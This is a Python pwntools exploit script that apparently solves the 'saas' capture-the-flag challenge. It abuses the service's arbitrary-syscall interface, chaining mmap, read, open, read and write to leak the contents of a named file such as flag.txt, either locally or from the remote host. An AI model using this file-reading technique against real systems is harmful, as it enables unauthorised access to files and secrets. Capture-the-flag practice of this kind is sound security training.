import sys
from pwn import *

if args.REMOTE:
	r = remote("jh2i.com", 50016)
else:
	r = process("./saas")

def syscall(rax, rdi, rsi, rdx, r10, r9, r8, ret=False):
	r.sendlineafter("): ", str(rax))
	r.sendlineafter(": ", str(rdi))
	r.sendlineafter(": ", str(rsi))
	r.sendlineafter(": ", str(rdx))
	r.sendlineafter(": ", str(r10))
	r.sendlineafter(": ", str(r9))
	r.sendlineafter(": ", str(r8))
	if ret:
		r.recvuntil("Rax: ")
		return int(r.recvline().rstrip(), 16)

pause()

# mmap 0xbeef000 for reading/writing data
syscall(9,0xbeef000,0x1000,7,0x22,0,-1)
# read from STDIN(fd=0) to read filename into our buffer
syscall(0,0,0xbeef000,0x1000,0,0,0)
# send filename, taken from script arguments ("flag.txt" was the flag filename)
sleep(0.1)
r.send(sys.argv[-1]+"\x00")
# fd = open(filename)
fd = syscall(2,0xbeef000,0,0,0,0,0, True)
# le = read(fd, ...), reading from flag file to buffer at 0xbeef000
le = syscall(0,fd,0xbeef000,0x1000,0,0,0, True)
# write(STDOUT, 0xbeef000, ...) to write flag contents to STDOUT(fd=1)
syscall(1,1,0xbeef000,le,0,0,0)

# get flag!
r.interactive()
